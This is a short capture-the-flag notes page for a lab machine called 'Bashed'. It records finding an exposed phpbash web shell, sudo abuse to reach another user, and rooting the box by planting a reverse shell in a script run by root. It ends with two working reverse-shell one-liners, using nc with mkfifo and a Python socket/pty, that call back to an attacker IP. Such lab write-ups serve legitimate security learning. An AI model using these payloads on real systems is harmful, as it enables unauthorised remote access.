# <span style="color:[COLOR]">Machine #30 Bashed</span>  



## <span style="color:[COLOR]">Checklist π€   



<br/><br/>


## <span style="color:[COLOR]">What Do We Have? π€π€ 
* Some script called `phpbash` that seems to be running on the server.  
* I tried to visit `http://[IP]/uploads` and it worked. It exists.
* I also tried to send a post request to the uploads with the parameter `cmd`, the command `whoami` didn't work, gave me an error `412 Precondition Failed` but when I tried `pwd` or `cat /etc/passwd` it worked but it didn't return an output. Anyway, it doesn't have to return an output.  
* I also have the source code of the phpbash thing which gives me an upper hand.  
* There's a directory called `/php` it seems according to the contact form I found this `/php/sendMail.php`. 
* I was able to open `/php` and it did not include anything but `sendMail.php` but if I was able to open it doesn't that mean that I have Directory Traversal vulnerability. 
* I think I do have directory traversal.
* Found a `/dev` directory through gobuster and since I have directory traversal I was able to view the directory and find that `phpbash.php` is stored there.
* I had the ability to `sudo` any command of the user `scriptmanager` so it was really simple to just `sudo /bin/bash` and this way I got this user
```
User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```  
* To get the root I was able to edit a script that the root ran with the command `python` which left me no choice but to inject a rev shell inside this script and wait for the root to execute it and then BOOM I'm root.  
* One of the easiest machines I solved so far.

<br/><br/>


## <span style="color:[COLOR]">Random Notesπ

<br/><br/>  


## <span style="color:[COLOR]">How Did I Own This Shit ππ₯³  

<br/><br/>



## <span style="color:[COLOR]">Where I Got Stuck?π‘π§  


<br/><br/>



## <span style="color:[COLOR]">What Did I learn from this Machine?π  


<br/><br/>



## <span style="color:[COLOR]">Writeups βπ½π   


<br/><br/>

<!-- @nested-tags:EXAMPLE/OF/NESTED/TAGS-->  
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.72 1234 >/tmp/f  





import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.72",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
